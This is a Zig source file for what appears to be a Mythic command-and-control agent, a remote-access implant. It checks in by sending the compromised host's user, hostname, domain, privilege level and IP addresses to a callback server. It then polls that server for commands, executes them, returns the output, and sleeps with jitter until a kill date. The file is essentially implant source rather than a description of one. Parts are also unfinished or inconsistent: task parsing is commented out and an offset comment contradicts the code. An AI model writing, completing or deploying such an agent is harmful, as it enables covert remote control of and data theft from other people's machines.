const std = @import("std");
const base64 = std.base64;
const types = @import("types.zig");
const commands = @import("commands.zig");
const network = @import("network.zig");
const utils = @import("utils.zig");

const print = std.debug.print;
const ArrayList = std.ArrayList;
const Allocator = std.mem.Allocator;
const json = std.json;
const time = std.time;

const AgentConfig = types.AgentConfig;
const MythicTask = types.MythicTask;
const MythicResponse = types.MythicResponse;
const TaskStatus = types.TaskStatus;
const CommandExecutor = commands.CommandExecutor;
const NetworkClient = network.NetworkClient;
const SystemInfo = utils.SystemInfo;
const CryptoUtils = utils.CryptoUtils;
const TimeUtils = utils.TimeUtils;

// Main Mythic agent structure
pub const MythicAgent = struct {
    const Self = @This();
    
    // Core properties
    allocator: Allocator,
    config: AgentConfig,
    uuid: []const u8,
    session_id: []const u8,
    network_client: NetworkClient,
    command_executor: CommandExecutor,
    system_info: SystemInfo,
    crypto_utils: CryptoUtils,
    
    // Crypto
    aes_key: [32]u8,
    payload_uuid: []const u8,
    
    // State
    tasks: ArrayList(MythicTask),
    pending_responses: ArrayList(MythicResponse),
    is_running: bool,
    last_checkin: i64,
    
    pub fn init(allocator: Allocator, config: AgentConfig) !Self {
        var crypto_utils = CryptoUtils.init(allocator);
        
        // Generate UUIDs and keys
        const uuid = "b1d4ed2c-6d68-43c2-8963-435ef3cc52f9";
        const session_id = try crypto_utils.generateSessionId();
        const aes_key = CryptoUtils.generateAESKey();
        const payload_uuid = "b1d4ed2c-6d68-43c2-8963-435ef3cc52f9";
        
        return Self{
            .allocator = allocator,
            .config = config,
            .uuid = uuid,
            .session_id = session_id,
            .network_client = NetworkClient.init(allocator, config),
            .command_executor = CommandExecutor.init(allocator),
            .system_info = SystemInfo.init(allocator),
            .crypto_utils = crypto_utils,
            .aes_key = aes_key,
            .payload_uuid = payload_uuid,
            .tasks = ArrayList(MythicTask).init(allocator),
            .pending_responses = ArrayList(MythicResponse).init(allocator),
            .is_running = false,
            .last_checkin = 0,
        };
    }
    
    pub fn deinit(self: *Self) void {
        //self.allocator.free(self.uuid);
        self.allocator.free(self.session_id);
        //self.allocator.free(self.payload_uuid);
        self.tasks.deinit();
        self.pending_responses.deinit();
        self.network_client.deinit();
    }
    
    // Main agent loop
    pub fn run(self: *Self) !void {
        self.is_running = true;
        
        // Initial checkin
        try self.checkin();
        
        print("[+] Agent started with UUID: {s}\n", .{self.uuid});
        print("[+] Callback: {s}:{d}\n", .{ self.config.callback_host, self.config.callback_port });
        print("[+] Sleep interval: {d}s (jitter: {d:.1}%)\n", .{ self.config.sleep_interval, self.config.jitter * 100 });
        
        while (self.is_running) {
            // Check for kill date
            if (self.config.kill_date) |kill_date| {
                if (TimeUtils.isKillDateReached(kill_date)) {
                    print("[!] Kill date reached, terminating agent\n", .{});
                    break;
                }
            }
            
            // Get tasking from C2
            self.getTasks() catch |err| {
                print("[!] Failed to get tasks: {}\n", .{err});
            };
            
            // Process any pending tasks
            try self.processTasks();
            
            // Send responses back to C2
            self.sendResponses() catch |err| {
                print("[!] Failed to send responses: {}\n", .{err});
            };
            
            // Sleep with jitter
            self.sleep();
        }
        
        print("[+] Agent terminated\n", .{});
    }
    
    // Initial checkin with C2 server
    fn checkin(self: *Self) !void {
        // Allocate and free system info fields
        const user = try self.system_info.getCurrentUser();
        defer self.allocator.free(user);
        const host = try self.system_info.getHostname();
        defer self.allocator.free(host);
        const pid = try self.system_info.getPid();
        defer self.allocator.free(pid);
        const domain = try self.system_info.getDomain();
        defer self.allocator.free(domain);
        const integrity_level = try self.system_info.getIntegrityLevel();
        defer self.allocator.free(integrity_level);
        const external_ip = try self.system_info.getExternalIP();
        defer self.allocator.free(external_ip);
        const internal_ip = try self.system_info.getInternalIP();
        defer self.allocator.free(internal_ip);
        const process_name = try self.system_info.getProcessName();
        defer self.allocator.free(process_name);

        const checkin_data = .{
            .action = "checkin",
            .uuid = self.uuid,
            .user = user,
            .host = host,
            .pid = pid,
            .domain = domain,
            .integrity_level = integrity_level,
            .external_ip = external_ip,
            .ips = internal_ip,
            .process_name = process_name,
            //.payload_uuid = self.payload_uuid,
            //.encryption_key = try self.crypto_utils.encodeKey(&self.aes_key),
        };
        var json_buffer = std.ArrayList(u8).init(self.allocator);
        defer json_buffer.deinit();
        try json.stringify(checkin_data, .{}, json_buffer.writer());

        // Combine PayloadUUID + JSON and Base64 encode
        var combined = std.ArrayList(u8).init(self.allocator);
        defer combined.deinit();
        try combined.appendSlice(self.payload_uuid);
        try combined.appendSlice(json_buffer.items);
        
        const encoder = base64.standard.Encoder;
        const b64_len = encoder.calcSize(combined.items.len);
        const b64_data = try self.allocator.alloc(u8, b64_len);
        defer self.allocator.free(b64_data);
        _ = encoder.encode(b64_data, combined.items);

        // Send to Mythic server
        const response = try self.network_client.sendRequest("data", b64_data);
        defer self.allocator.free(response);

        self.last_checkin = TimeUtils.getCurrentTimestamp();
    }
    
    // Get tasks from C2 server
    fn getTasks(self: *Self) !void {
        const get_tasking_data = .{
            .action = "get_tasking",
            .tasking_size = 1,
            //.uuid = self.uuid,
        };
        
        var json_buffer = std.ArrayList(u8).init(self.allocator);
        defer json_buffer.deinit();

        try json.stringify(get_tasking_data, .{}, json_buffer.writer());
        print("[DEBUG] Tasking request JSON: {s}\n", .{json_buffer.items});

        var combined = std.ArrayList(u8).init(self.allocator);
        defer combined.deinit();

        try combined.appendSlice(self.payload_uuid);
        try combined.appendSlice(json_buffer.items);

        const encoder = base64.standard.Encoder;
        const b64_len = encoder.calcSize(combined.items.len);
        const b64_data = try self.allocator.alloc(u8, b64_len);
        defer self.allocator.free(b64_data);
        _ = encoder.encode(b64_data, combined.items);
        print("[DEBUG] Base64 encoded tasking request: {s}\n", .{b64_data});

        const response = try self.network_client.sendRequest("/data", b64_data);
        defer self.allocator.free(response);
        
        if (response.len == 0) {
            print("[ERROR] Empty tasking response from server\n", .{});
            return error.EmptyResponse;
        }

        // Parse Base64-encoded response (CallbackUUID + JSON)
        const decoded_response = try self.allocator.alloc(u8, base64.standard.Decoder.calcSizeForSlice(response) catch {
            print("[ERROR] Invalid Base64 response\n", .{});
            return error.InvalidBase64;
        });
        print("[DEBUG] Response: {s}\n", .{response});
        defer self.allocator.free(decoded_response);
        base64.standard.Decoder.decode(decoded_response, response) catch {
            print("[ERROR] Failed to decode Base64 response\n", .{});
            return error.InvalidBase64;
        };
        // Skip CallbackUUID (15 bytes for "payload-uuid-456")
        if (decoded_response.len < 36) {
            print("[ERROR] Response too short to contain CallbackUUID\n", .{});
            return error.InvalidResponse;
        }
        const json_response = decoded_response[36..];
        // Parse JSON tasks
        const Task = struct {
            id: []const u8,
            command: []const u8,
            timestamp: f64,
            parameters: json.Value,
        };
        const parsed = json.parseFromSlice(struct { tasks: []Task }, self.allocator, json_response, .{}) catch |err| {
            print("[ERROR] Failed to parse tasking JSON: {}\n", .{err});
            return err;
        };
        defer parsed.deinit();

        print("[+] Received {d} tasks:\n", .{parsed.value.tasks.len});
        for (parsed.value.tasks) |task| {
            print("  Task ID: {s}, Command: {s}, Parameters: {}\n, Timestamp: {d}" , .{
                task.id,
                task.command,
                task.parameters,
                task.timestamp,
            });
            
        }
    
        // Parse response for new tasks
        //try self.parseTaskResponse(response);
    }
    
    // Parse task response from C2
    fn parseTaskResponse(self: *Self, response: []const u8) !void {
        const parsed = json.parseFromSlice(json.Value, self.allocator, response, .{}) catch return;
        defer parsed.deinit();
        
        if (parsed.value.object.get("tasks")) |tasks_value| {
            if (tasks_value.array.items.len > 0) {
                for (tasks_value.array.items) |task_value| {
                    const task_obj = task_value.object;
                    
                    const task = MythicTask{
                        .id = try self.allocator.dupe(u8, task_obj.get("id").?.string),
                        .command = try self.allocator.dupe(u8, task_obj.get("command").?.string),
                        .parameters = try self.allocator.dupe(u8, task_obj.get("parameters").?.string),
                        .timestamp = try self.allocator.dupe(u8, task_obj.get("timestamp").?.string),
                    };
                    
                    try self.tasks.append(task);
                    print("[+] Received task: {s} - {s}\n", .{ task.command, task.id });
                }
            }
        }
    }
    
    // Process pending tasks
    fn processTasks(self: *Self) !void {
        for (self.tasks.items) |*task| {
            if (task.status == .submitted) {
                task.status = .processing;
                print("[*] Processing task: {s}\n", .{task.command});
                
                // Handle exit command
                if (std.mem.eql(u8, task.command, "exit")) {
                    self.is_running = false;
                    const exit_response = MythicResponse{
                        .task_id = task.id,
                        .user_output = "Agent terminating...",
                        .completed = true,
                        .status = "completed",
                    };
                    try self.pending_responses.append(exit_response);
                    task.status = .completed;
                    continue;
                }
                
                const result = self.command_executor.executeTask(task.*) catch |err| {
                    const error_response = MythicResponse{
                        .task_id = task.id,
                        .user_output = try std.fmt.allocPrint(self.allocator, "Error executing task: {}", .{err}),
                        .completed = true,
                        .status = "error",
                    };
                    try self.pending_responses.append(error_response);
                    task.status = .erroragent;
                    continue;
                };
                
                try self.pending_responses.append(result);
                task.status = .completed;
            }
        }
    }
    
    // Send responses back to C2
    fn sendResponses(self: *Self) !void {
        for (self.pending_responses.items) |response| {
            const response_data = .{
                .action = "post_response",
                .uuid = self.uuid,
                .task_id = response.task_id,
                .response = response.user_output,
                .completed = response.completed,
                .status = response.status,
                .artifacts = response.artifacts,
            };
            
            const json_data = try json.stringifyAlloc(self.allocator, response_data, .{});
            defer self.allocator.free(json_data);
            
            const server_response = try self.network_client.sendRequest("/api/v1.4/agent_message", json_data);
            defer self.allocator.free(server_response);
            
            print("[+] Sent response for task: {s}\n", .{response.task_id});
        }
        
        // Clear pending responses
        self.pending_responses.clearAndFree();
    }
    
    // Sleep with jitter
    fn sleep(self: *Self) void {
        const sleep_time = TimeUtils.calculateJitteredSleep(self.config.sleep_interval, self.config.jitter);
        print("[*] Sleeping for {d} seconds...\n", .{sleep_time});
        TimeUtils.sleep(sleep_time);
    }
};
